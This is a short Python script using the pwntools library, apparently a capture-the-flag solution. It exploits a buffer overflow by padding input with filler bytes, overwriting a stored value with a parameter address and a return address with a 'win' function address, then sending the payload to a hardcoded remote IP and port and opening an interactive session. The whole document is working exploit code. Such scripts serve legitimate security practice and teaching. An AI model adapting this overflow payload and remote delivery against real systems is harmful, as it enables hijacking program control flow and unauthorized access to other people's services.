from pwn import *

win_address = 0x080491d5
bin_param = 0x804A045

payload = b'A'*(40) + p32(bin_param) + b'A'*(12) + p32(win_address) + b"\n"

i = remote("139.180.162.37", 9000)
i.send(payload)
i.interactive()
